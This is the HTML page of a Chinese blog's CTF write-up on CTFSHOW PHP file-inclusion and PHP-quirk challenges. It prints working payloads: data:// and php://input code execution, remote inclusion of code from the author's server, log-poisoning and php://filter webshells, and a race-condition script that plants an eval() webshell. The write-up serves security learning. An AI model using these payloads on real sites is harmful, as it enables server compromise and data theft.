<!DOCTYPE html>
<html lang="zh" dir="auto">

<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>CTFSHOW-文件包含-Writeup | Xrntkk&#39;s Blog</title>
<meta name="keywords" content="writeup, ctf, Web">
<meta name="description" content="
以PHP为例,常用的文件包含函数有以下四种include(),require(),include_once(),require_once()
Web78
php伪协议">
<meta name="author" content="Xrntkk">
<link rel="canonical" href="http://localhost:1313/post/ctfshow/ctfshow_%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">

<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
  <meta name="referrer" content="no-referrer-when-downgrade">
<link crossorigin="anonymous" href="/assets/css/stylesheet.3fcf74ad9d359e0c6c3d2b51a42f684a692fd9cd053c3829756ad5f3e4c4649b.css" integrity="sha256-P890rZ01ngxsPStRpC9oSmkv2c0FPDgpdWrV8&#43;TEZJs=" rel="preload stylesheet" as="style">
<link rel="icon" href="http://localhost:1313/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="zh" href="http://localhost:1313/post/ctfshow/ctfshow_%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
</noscript><link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,100..800;1,100..800&display=swap" rel="stylesheet">
<meta name="baidu-site-verification" content="codeva-snmPZ4WZk8" /><meta property="og:url" content="http://localhost:1313/post/ctfshow/ctfshow_%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">
  <meta property="og:site_name" content="Xrntkk&#39;s Blog">
  <meta property="og:title" content="CTFSHOW-文件包含-Writeup">
  <meta property="og:description" content=" 以PHP为例,常用的文件包含函数有以下四种include(),require(),include_once(),require_once()
Web78 php伪协议">
  <meta property="og:locale" content="zh">
  <meta property="og:type" content="article">
    <meta property="article:section" content="post">
    <meta property="article:published_time" content="2024-12-22T00:27:55+08:00">
    <meta property="article:modified_time" content="2024-12-22T00:27:55+08:00">
    <meta property="article:tag" content="Writeup">
    <meta property="article:tag" content="Ctf">
    <meta property="article:tag" content="Web">
      <meta property="og:image" content="https://i.postimg.cc/7hwBy7VS/calcr.png">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://i.postimg.cc/7hwBy7VS/calcr.png">
<meta name="twitter:title" content="CTFSHOW-文件包含-Writeup">
<meta name="twitter:description" content="
以PHP为例,常用的文件包含函数有以下四种include(),require(),include_once(),require_once()
Web78
php伪协议">


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "http://localhost:1313/post/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "CTFSHOW-文件包含-Writeup",
      "item": "http://localhost:1313/post/ctfshow/ctfshow_%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "CTFSHOW-文件包含-Writeup",
  "name": "CTFSHOW-文件包含-Writeup",
  "description": " 以PHP为例,常用的文件包含函数有以下四种include(),require(),include_once(),require_once()\nWeb78 php伪协议\n",
  "keywords": [
    "writeup", "ctf", "Web"
  ],
  "articleBody": " 以PHP为例,常用的文件包含函数有以下四种include(),require(),include_once(),require_once()\nWeb78 php伪协议\n1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-16 10:52:43 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-16 10:54:20 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14 15if(isset($_GET['file'])){ 16 $file = $_GET['file']; 17 include($file); 18}else{ 19 highlight_file(__FILE__); 20} payload:\n?file=data://text/plain,\u003c?php system(\"cat flag.php\")?\u003e\n查看源代码，得到flag\nweb79 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-16 11:10:14 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-16 11:12:38 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14 15if(isset($_GET['file'])){ 16 $file = $_GET['file']; 17 $file = str_replace(\"php\", \"???\", $file); 18 include($file); 19}else{ 20 highlight_file(__FILE__); 21} 这题相对于上一题会将file中的php替换为???\n我们可以通过base64进行绕过\n?file=data://text/plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4= or\n?file=data://text/plain,\u003c?=system('tac flag*');?\u003e ?file=data://text/plain,\u003c?Php echo `tac f*`;?\u003e or\n远程加载\n加载robots.txt，发现可以回显\n在自己vps上创建1.txt，内容如下 \u003c?php system(\"tac flag.php\");?\u003e\n起一个http服务，加载 url/?file=http://x.x.x.x:7001/1.txt\nor\ninput协议 大小写绕过\npayload:\nPOST /?file=Php://input HTTP/1.1\r\u003c?Php system(\"cat flag.php\");?\u003e web80 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-16 11:26:29 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14 15if(isset($_GET['file'])){ 16 $file = $_GET['file']; 17 $file = str_replace(\"php\", \"???\", $file); 18 $file = str_replace(\"data\", \"???\", $file); 19 include($file); 20}else{ 21 highlight_file(__FILE__); 22} 日志包含\n写入一句话木马\n连webshell工具或者直接get传参\n?file=/var/log/nginx/access.log\u00262=system('ls /var/www/html');phpinfo();\r?file=/var/log/nginx/access.log\u00262=system('tac /var/www/html/fl0g.php');phpinfo(); Or\ninput协议 大小写绕过\npayload:\nPOST /?file=Php://input HTTP/1.1\r\u003c?Php system(\"cat flag.php\");?\u003e web81 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-16 15:51:31 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13if(isset($_GET['file'])){ 14 $file = $_GET['file']; 15 $file = str_replace(\"php\", \"???\", $file); 16 $file = str_replace(\"data\", \"???\", $file); 17 $file = str_replace(\":\", \"???\", $file); 18 include($file); 19}else{ 20 highlight_file(__FILE__); 21} 同上web80\nweb82 条件竞争\npoc\n1import requests 2import io 3import threading 4 5url='http://9a77fcb3-6f3c-4bd6-a247-07bfe6766509.challenge.ctf.show:8080/' 6sessionid='ctfshow' 7data={ 8\t\"1\":\"file_put_contents('/var/www/html/jiuzhen.php','\u003c?php eval($_POST[3]);?\u003e');\" 9} 10#这个是访问/tmp/sess_ctfshow时，post传递的内容，是在网站目录下写入一句话木马。这样一旦访问成功，就可以蚁剑连接了。 11def write(session):#/tmp/sess_ctfshow中写入一句话木马。 12\tfileBytes = io.BytesIO(b'a'*1024*50) 13\twhile True: 14\tresponse=session.post(url, 15\tdata={ 16\t'PHP_SESSION_UPLOAD_PROGRESS':'\u003c?php eval($_POST[1]);?\u003e' 17\t}, 18\tcookies={ 19\t'PHPSESSID':sessionid 20\t}, 21\tfiles={ 22\t'file':('ctfshow.jpg',fileBytes) 23\t} 24\t) 25 26def read(session):#访问/tmp/sess_ctfshow，post传递信息，在网站目录下写入木马。 27\twhile True: 28\tresponse=session.post(url+'?file=/tmp/sess_'+sessionid,data=data, 29\tcookies={ 30\t'PHPSESSID':sessionid 31\t} 32\t) 33\tresposne2=session.get(url+'jiuzhen.php');#访问木马文件，如果访问到了就代表竞争成功 34\tif resposne2.status_code==200:了 35\tprint('++++++done++++++') 36\telse: 37\tprint(resposne2.status_code) 38 39if __name__ == '__main__': 40 41\tevnet=threading.Event() 42\t#写入和访问分别设置5个线程。 43\twith requests.session() as session: 44\tfor i in range(5): 45\tthreading.Thread(target=write,args=(session,)).start() 46\tfor i in range(5): 47\tthreading.Thread(target=read,args=(session,)).start() 48 49\tevnet.set() getshell\n直接查flag\n利用条件\n存在文件包含漏洞 知道session文件存放路径，可以尝试默认路径 具有读取和写入session文件的权限 这两个脚本理论上适用于web82-web86\nweb83 web83的开篇设置了session_unset();session_destroy();\nsession_unset()：释放当前在内存中已经创建的所有$_SESSION变量，但不删除session文件以及不释放对应的。 session_destroy()：删除当前用户对应的session文件以及释放sessionid，内存中的$_SESSION变量内容依然保留。\n就是释放和清除了前面所有session变量和文件，但是我们的解题思路是竞争上传那一瞬间创建的session，所以不影响。\nweb84 加上了一个system(rm -rf /tmp/*);，但是因为本来session.upload_progress.cleanup = on，就会清空对应session文件中的内容，这里加上删除，对竞争的影响不大。（但是可能需要增加一些线程）\nweb85 添加了一个内容识别，如果有\u003c就die，依旧可以竞争。\nweb86 dirname(FILE)表示当前文件的绝对路径。set_include_path函数,是用来设置include的路径的，就是include()可以不提供文件的完整路径了。 include文件时,当包含路径既不是相对路径，也不是绝对路径时(如:include(“test.php”))，会先查找include_path所设置的目录。 脚本里用的是完整路径，不影响竞争。\nweb82-86：参考https://blog.csdn.net/m0_48780534/article/details/125410757\nweb87 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-16 21:57:55 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14if(isset($_GET['file'])){ 15 $file = $_GET['file']; 16 $content = $_POST['content']; 17 $file = str_replace(\"php\", \"???\", $file); 18 $file = str_replace(\"data\", \"???\", $file); 19 $file = str_replace(\":\", \"???\", $file); 20 $file = str_replace(\".\", \"???\", $file); 21 file_put_contents(urldecode($file), \"\u003c?php die('大佬别秀了');?\u003e\".$content); 22 23 24}else{ 25 highlight_file(__FILE__); 26} 使用 file_put_contents 函数将经过处理后的内容写入到文件中。写入的内容是先拼接了一个 \u003c?php die('大佬别秀了');?\u003e 字符串,用于在后续如果有人直接访问写入后的文件时，防止文件内容被直接执行而显示一些提示信息，然后再拼接上从 $_POST 中获取的 $content 变量的值。\n这道题需要用到php://filter\nphp://filter的使用 原文：谈一谈php://filter的妙用 | 离别歌\nphp://filter之前最常出镜的地方是XXE。由于XXE漏洞的特殊性，我们在读取HTML、PHP等文件时可能会抛出此类错误parser error : StartTag: invalid element name 。其原因是，PHP是基于标签的脚本语言，\u003c?php ... ?\u003e这个语法也与XML相符合，所以在解析XML的时候会被误认为是XML，而其中内容（比如特殊字符）又有可能和标准XML冲突，所以导致了出错。\n那么，为了读取包含有敏感信息的PHP等源文件，我们就要先将“可能引发冲突的PHP代码”编码一遍，这里就会用到php://filter。\nphp://filter是PHP语言中特有的协议流，作用是作为一个“中间流”来处理其他流。比如，我们可以用如下一行代码将POST内容转换成base64编码并输出：\nreadfile(\"php://filter/read=convert.base64-encode/resource=php://input\"); 如下：\n所以，在XXE中，我们也可以将PHP等容易引发冲突的文件流用php://filter协议流处理一遍，这样就能有效规避特殊字符造成混乱。\n如下，我们使用的是php://filter/read=convert.base64-encode/resource=./xxe.php\n回归正题\n我们审一下这道题目的代码\n相比上一道题这题增加了一个post参数，且会将传入的参数进行拼接后写入文件\n1 $content = $_POST['content']; 2 file_put_contents(urldecode($file), \"\u003c?php die('大佬别秀了');?\u003e\".$content); 这道题在$content和$file之间拼接了一个\u003c?php die('大佬别秀了');?\u003e，导致即使我们成功写入一句话，也执行不了\n我们如何绕过这个die呢？\n其实我们可以通过php://filter流的base64-decode方法来去除这个die\n因为php在解码base64编码的时候会先将不属于base64中的字符去除，再进行转换，如下\n1\u003c?php 2$_GET['txt'] = preg_replace('|[^a-z0-9A-Z+/]|s', '', $_GET['txt']); 3base64_decode($_GET['txt']); 所以，我们可以使用 php://filter/write=convert.base64-decode 来首先对其解码。在解码的过程中，字符\u003c、?、;、\u003e、、(、) 、‘空格等字符不符合base64编码的字符范围将被忽略，所以最终被解码的字符仅有“phpdie”和我们传入的其他字符。\n”phpdie“一共6个字符，由于base64算法解码时是4个byte一组，所以给他增加2个“a”一共8个字符。这样，“phpdie\"被正常解码，而后面我们传入的webshell的base64内容也被正常解码。\n同时由于会对传入的file进行url解码，所以需要对传入的file进行两次url编码\nwarning!!!url编码需要连同英文字符一起进行转换，可以借助hackbar强制进行转换（找了很久）\npoc:\n原文：file=php://filter/write=convert.base64-decode/resource=shell.php\rfile=%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%34%25%36%35%25%36%33%25%36%66%25%36%34%25%36%35%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%37%33%25%36%38%25%36%35%25%36%63%25%36%63%25%32%65%25%37%30%25%36%38%25%37%30 原文：content=\u003c?php system('cat fl0g.php');?\u003e\rcontent=aaPD9waHAgc3lzdGVtKCdjYXQgZmwwZy5waHAnKTs/Pg== 访问shell.php,得到flag\n其实还可以通过其他编码来进行绕过如rot13\n更多file_put_content和死亡·杂糅代码之缘 - 先知社区\nweb88 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-17 02:27:25 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12 */ 13if(isset($_GET['file'])){ 14 $file = $_GET['file']; 15 if(preg_match(\"/php|\\~|\\!|\\@|\\#|\\\\$|\\%|\\^|\\\u0026|\\*|\\(|\\)|\\-|\\_|\\+|\\=|\\./i\", $file)){ 16 die(\"error\"); 17 } 18 include($file); 19}else{ 20 highlight_file(__FILE__); 21} 这题过滤了很多字符但是没有过滤:、/、;\npoc\n?file=data://text/plain;base64,PD89c3lzdGVtKCJ0YWMgZmwwZy5waHAiKTsgPz4 web116 拿到题目环境，发现是个视频，下载视频用binwalk扫一下\n提取图片，发现是源码\n直接get传参读flag\n?file=flag.php web117 web87的后续 死亡绕过\n1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: yu22x 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-01 18:16:59 9 10*/ 11highlight_file(__FILE__); 12error_reporting(0); 13function filter($x){ 14 if(preg_match('/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i',$x)){ 15 die('too young too simple sometimes naive!'); 16 } 17} 18$file=$_GET['file']; 19$contents=$_POST['contents']; 20filter($file); 21file_put_contents($file, \"\u003c?php die();?\u003e\".$contents); 这题过滤了一些php的协议和转换器\n但是没过滤掉filter和convert\n我们可以考虑用filter搭配convert.iconv.*过滤器来构造出payload\n参考文章：详解php://filter以及死亡绕过_filter绕过过滤-CSDN博客\n1\u003c?php 2 ?\u003e'); 3echo $enc; 4?\u003e 首先我们先将一句话木马从UCS-2BE转换成UCS-2LE\n?? 接着构造payload将一句话木马从UCS-2LE转换回UCS-2BE，同时破坏掉\u003c?php die();?\u003e\n效果如下\npayload:\nfile=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=shell.php\rcontents=?? 成功写入一句话木马，拿到flag\nphp特性 参考网站：\nphp一些特性函数（ctfshow）\nweb89 1\u003c?php 2 3/* 4\\# -*- coding: utf-8 -*- 5\\# @Author: h1xa 6\\# @Date: 2020-09-16 11:25:09 7\\# @Last Modified by: h1xa 8\\# @Last Modified time: 2020-09-18 15:38:51 9\\# @email: h1xa@ctfer.com 10\\# @link: https://ctfer.com 11 12*/ 13 14 15include(\"flag.php\"); 16highlight_file(__FILE__); 17 18if(isset($_GET['num'])){ 19 $num = $_GET['num']; 20 if(preg_match(\"/[0-9]/\", $num)){ 21 die(\"no no no!\"); 22 } 23 if(intval($num)){ 24 echo $flag; 25 } 26} 这题要用到数组绕过的特性来绕过preg_match的匹配\npreg_match函数： preg_match函数是用于完成字符串的正则匹配的函数，如果找到一个匹配的，就返回1，否则就返回0。 preg_match只能处理字符串，如果传入的值是数组的话，就会报错，从而返回false，绕过了正则匹配。\nintval函数: 定义:intval()函数是 PHP 中的一个内置函数。它用于获取变量的整数值。其基本语法是intval($var, $base = 10)。其中$var是要转换的变量，$base是可选参数，用于指定进制（当$var`是字符串时），默认是十进制。\n特性：\n1.如果变量本身是整数，intval()函数会返回变量本身的值。\n2.当变量是字符串时，intval()会尝试将字符串转换为整数。它会从字符串的开头提取数字部分，直到遇到非数字字符为止。\n3.如果字符串以非数字字符开头，intval()会返回 0。\n4.当第二个参数$base被指定时，intval()可以将字符串按照指定的进制转换为十进制整数。\n注意事项\n1.对于浮点数，intval()会直接截断小数部分，而不是进行四舍五入。\n2.当处理超出整数范围的值时（在 PHP 中，根据平台和配置不同，整数范围有所不同），可能会出现意外的结果。例如，在 32 位系统上，int类型的最大值是2147483647，如果intval()处理的值超过这个范围，可能会导致数据丢失或者不正确的转换。\n这道题直接用数组绕过\npayload:\n?num[]=1 web90 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-18 16:06:11 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14 15include(\"flag.php\"); 16highlight_file(__FILE__); 17if(isset($_GET['num'])){ 18 $num = $_GET['num']; 19 if($num===\"4476\"){ 20 die(\"no no no!\"); 21 } 22 if(intval($num,0)===4476){ 23 echo $flag; 24 }else{ 25 echo intval($num,0); 26 } 27} 设置$base = 0能提供一种根据字符串内容自动判断进制来进行转换的灵活方式。\n这道题可以利用intval的特性和php强比较的特性\n当变量是字符串时，intval()会尝试将字符串转换为整数。它会从字符串的开头提取数字部分，直到遇到非数字字符为止。\nweb91 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Firebasky 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-18 16:16:09 9# @link: https://ctfer.com 10 11*/ 12 13show_source(__FILE__); 14include('flag.php'); 15$a=$_GET['cmd']; 16if(preg_match('/^php$/im', $a)){ 17 if(preg_match('/^php$/i', $a)){ 18 echo 'hacker'; 19 } 20 else{ 21 echo $flag; 22 } 23} 24else{ 25 echo 'nonononono'; 26} 这题考察的是一个正则表达式的理解和绕过\n这两个正则表达式都是用来匹配字符串php的\n/^php$/im 的含义 ^：表示字符串的开始。 php：表示匹配字符 php。 $：表示字符串的结束。 i：表示不区分大小写。 m：表示多行模式（multi-line）。 要得到flag，我们需要让第一个判断为true，第二个判断为false\n而第二个正则表达式与正则表达式一的区别在于他没有进行多行匹配\n那我们只需要通过换行符就可以实现绕过\npayload:\ncmd=%oaphp web92 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Firebasky 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-18 16:29:30 9# @link: https://ctfer.com 10 11*/ 12 13include(\"flag.php\"); 14highlight_file(__FILE__); 15if(isset($_GET['num'])){ 16 $num = $_GET['num']; 17 if($num==4476){ 18 die(\"no no no!\"); 19 } 20 if(intval($num,0)==4476){ 21 echo $flag; 22 }else{ 23 echo intval($num,0); 24 } 25} 这题与90题的区别就在于这里进行的是弱类型的比较\n在弱类型的比较里面我们不能通过增加字母的方式绕过，如下\n\"123aa\" == 123\r\"123aa\" === 123aa 我们可以通过其它方法来绕过\n如通过intval函数的特性，我们可以通过输入转换成其他进制的4476来进行绕过（前面说过当base=0时会自动进行进制的转换）。\npayload：\nHEX: 0x117c //十进制前面补0x\rOCT: 010574 //八进制前面补0 或者\n官方题解\nintval()函数如果$base为0则$var中存在字母的话遇到字母就停止读取,但是e这个字母比较特殊，可以在PHP中不是科学计数法。所以为了绕过前面的==4476，我们就可以构造 4476e123\nweb93 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Firebasky 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-18 16:32:58 9# @link: https://ctfer.com 10 11*/ 12 13include(\"flag.php\"); 14highlight_file(__FILE__); 15if(isset($_GET['num'])){ 16 $num = $_GET['num']; 17 if($num==4476){ 18 die(\"no no no!\"); 19 } 20 if(preg_match(\"/[a-z]/i\", $num)){ 21 die(\"no no no!\"); 22 } 23 if(intval($num,0)==4476){ 24 echo $flag; 25 }else{ 26 echo intval($num,0); 27 } 28} preg_match(\"/[a-z]/i\", $num) 相比上一题这题增加了一个字母的匹配，让我们不能用上一题e绕过的方法和十六进制绕过的方法\n但是八进制绕过依旧是可行的，因为他不包含字母\npayload:\nnum=010574 web94 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-18 16:46:19 9# @link: https://ctfer.com 10 11*/ 12 13include(\"flag.php\"); 14highlight_file(__FILE__); 15if(isset($_GET['num'])){ 16 $num = $_GET['num']; 17 if($num===\"4476\"){ 18 die(\"no no no!\"); 19 } 20 if(preg_match(\"/[a-z]/i\", $num)){ 21 die(\"no no no!\"); 22 } 23 if(!strpos($num, \"0\")){ 24 die(\"no no no!\"); 25 } 26 if(intval($num,0)===4476){ 27 echo $flag; 28 } 29} !strpos($num, \"0\") 这题增加了一个条件，同时判断也变成了强判定，这里的strpos()函数用于查找字符串在另一个字符串中首次出现的位置。\n也就是这里我们需要让首位不等于0才能使这个判断为false\nstrops函数绕过： 对于strpos()函数，我们可以利用换行进行绕过（%0a） payload:?num=%0a010574 也可以小数点绕过 payload：?num=4476.0 因为intval()函数只读取整数部分 还可以八进制绕过(%20是空格的url编码形式) payload：?num=%20010574 ?num= 010574 // 前面加个空格 ?num=+010574 ?num=+4476.0\n我们选用其中一个绕过方法即可\n如空格绕过\n?num=%20010574 这题因为用的是强判定也可以用这种方法\n?num=4476.0 这种方法就是使其变为浮点型从而使强判定为false，绕过第一个判定\nweb95 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-18 16:53:59 9# @link: https://ctfer.com 10 11*/ 12 13include(\"flag.php\"); 14highlight_file(__FILE__); 15if(isset($_GET['num'])){ 16 $num = $_GET['num']; 17 if($num==4476){ 18 die(\"no no no!\"); 19 } 20 if(preg_match(\"/[a-z]|\\./i\", $num)){ 21 die(\"no no no!!\"); 22 } 23 if(!strpos($num, \"0\")){ 24 die(\"no no no!!!\"); 25 } 26 if(intval($num,0)===4476){ 27 echo $flag; 28 } 29} 这题和上一题的区别就是改为了弱判定\n所以上一题的方法二就用不了了，我们用方法一即可\npayload:\n?num=%20010574 web96 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-18 19:21:24 9# @link: https://ctfer.com 10 11*/ 12 13 14highlight_file(__FILE__); 15 16if(isset($_GET['u'])){ 17 if($_GET['u']=='flag.php'){ 18 die(\"no no no\"); 19 }else{ 20 highlight_file($_GET['u']); 21 } 22 23 24} 我们知道./指的的是当前目录，所以直接用./绕过即可，不影响文件读取\npayload:\n?u=./flag.php or\nu=/var/www/html/flag.php\r?u=php://filter/read=convert.base64-encode/resource=flag.php web97 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-18 19:36:32 9# @link: https://ctfer.com 10 11*/ 12 13include(\"flag.php\"); 14highlight_file(__FILE__); 15if (isset($_POST['a']) and isset($_POST['b'])) { 16if ($_POST['a'] != $_POST['b']) 17if (md5($_POST['a']) === md5($_POST['b'])) 18echo $flag; 19else 20print 'Wrong.'; 21} 22?\u003e 这是一道md5强比较的题目，绕过姿势挺多\n我们可以通过简单的数组绕过\na[]=1\u0026b[]=2 虽然会报错但是能拿到flag\nweb98 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-18 21:39:27 9# @link: https://ctfer.com 10 11*/ 12 13include(\"flag.php\"); 14$_GET?$_GET=\u0026$_POST:'flag'; 15$_GET['flag']=='flag'?$_GET=\u0026$_COOKIE:'flag'; 16$_GET['flag']=='flag'?$_GET=\u0026$_SERVER:'flag'; 17highlight_file($_GET['HTTP_FLAG']=='flag'?$flag:__FILE__); 18 19?\u003e CTFSHOW web入门刷题 web98-112_ctfshow web98-CSDN博客\n这道题用到了三元运算符\n首先判断是否GET传入了数据，如果传入了则将POST的地址赋值给了GET\n其实就是用POST替换GET\n如果GET存在flag字段的值则会继续替换，最后替换成SERVER\n这里我们只要GET随便传入一个数据让post替换get\n然后post传入 HTTP_FLAG=flag\n这样最后highlight_file就能去显示$flag\n这道题一开始没看懂代码，看了上面大佬的解释感觉其实也不难\nweb99 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-18 22:36:12 9# @link: https://ctfer.com 10 11*/ 12 13highlight_file(__FILE__); 14$allow = array(); 15for ($i=36; $i \u003c 0x36d; $i++) { 16 array_push($allow, rand(1,$i)); 17} 18if(isset($_GET['n']) \u0026\u0026 in_array($_GET['n'], $allow)){ 19 ($_GET['n'], $_POST['content']); 20} 21 22?\u003e 这道题首先是创建了一个数组，然后通过循环写入数字（范围0~0x36d）\n接着对传入的n进行判断，判断其是否在数组中，若存在则以n为名字创建一个文件并写入content的内容\n我们需要知道的是：\n在弱类型中当php字符串和int比较时,字符串会被转换成int，所以 字符串中数字后面的字符串会被忽略。题目中的in_array没有设置type,我们可以输入字符串5.php(此处数字随意，只要在rand(1,0x36d)之间即可),转换之后也就是5,明显是在题目中生成的数组中的\n所以我们通过传入content写马后，通过蚁剑连接或者直接命令执行即可得到flag\nweb100 1\u003c?php 2 3/* 4\\# -*- coding: utf-8 -*- 5\\# @Author: h1xa 6\\# @Date: 2020-09-16 11:25:09 7\\# @Last Modified by: h1xa 8\\# @Last Modified time: 2020-09-21 22:10:28 9\\# @link: https://ctfer.com 10 11*/ 12 13highlight_file(__FILE__); 14include(\"ctfshow.php\"); 15//flag in class ctfshow; 16$ctfshow = new ctfshow(); 17$v1=$_GET['v1']; 18$v2=$_GET['v2']; 19$v3=$_GET['v3']; 20$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3); 21if($v0){ 22 if(!preg_match(\"/\\;/\", $v2)){ 23 if(preg_match(\"/\\;/\", $v3)){ 24 eval(\"$v2('ctfshow')$v3\"); 25 } 26 } 27 28} 29 30 31 32?\u003e 这题其实就是一道简单的拼接题\n$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3); 这里看起来像是要求v1，v2，v3都为数字，实际上只需v1为数字则会将v1赋给v0，而不会再执行后面的语句\n所以我们这里只需要使v1为数字即可\npayload:\n?v1=21\u0026v2=var_dump($ctfshow)/*\u0026v3=*/; 或者用命令\n1?v1=1\u0026v2=system('ls')/*\u0026v3=*/; 将0x2d更换成-得到flag\nweb101 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-22 00:26:48 9# @link: https://ctfer.com 10 11*/ 12 13highlight_file(__FILE__); 14include(\"ctfshow.php\"); 15//flag in class ctfshow; 16$ctfshow = new ctfshow(); 17$v1=$_GET['v1']; 18$v2=$_GET['v2']; 19$v3=$_GET['v3']; 20$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3); 21if($v0){ 22 if(!preg_match(\"/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\*|\\)|\\-|\\_|\\+|\\=|\\{|\\[|\\\"|\\'|\\,|\\.|\\;|\\?|[0-9]/\", $v2)){ 23 if(!preg_match(\"/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\*|\\(|\\-|\\_|\\+|\\=|\\{|\\[|\\\"|\\'|\\,|\\.|\\?|[0-9]/\", $v3)){ 24 eval(\"$v2('ctfshow')$v3\"); 25 } 26 } 27 28} 29 30?\u003e 